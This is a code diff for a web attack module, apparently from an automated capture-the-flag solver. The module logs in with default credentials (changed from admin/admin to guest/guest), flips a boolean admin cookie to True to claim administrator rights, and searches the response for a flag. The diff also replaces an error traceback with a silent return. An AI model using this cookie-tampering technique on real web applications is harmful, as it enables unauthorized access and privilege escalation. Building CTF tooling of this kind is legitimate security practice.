@@ -1,7 +1,7 @@
 """
 Add or adjust cookies after fake logon.
 
-This unit will attempt to authenticate with the credentials ``admin/admin`` 
+This unit will attempt to authenticate with the credentials ``guest/guest`` 
 and then adjust the found cookies to claim that this user has administrator
 privileges.
 
@@ -109,13 +109,12 @@ class Unit(WebUnit):
                 r = s.request(
                     method.lower(),
                     self.target.url_root.rstrip("/") + "/" + action,
-                    data={username: "admin", password: "admin"},
+                    data={username: "guest", password: "guest"},
                 )
             except:
                 # JOHN: Theoretically, if we find a valid method,
-                #  this should not error... But if it does, we should see it.
-
-                traceback.print_exc()
+                #  this should not error... But if it does, ... give up??
+                return
 
             # Check out the cookies. Flip them if boolean, and look for flags.
             if s.cookies:
@@ -124,6 +123,7 @@ class Unit(WebUnit):
                         if s.cookies[admin_cookie] == "False":
                             s.cookies.update({admin_cookie: "True"})
                             new = requests.get(r.url, cookies={admin_cookie: "True"})
+
                             if self.manager.find_flag(self, new.text):
                                 break
                         else:
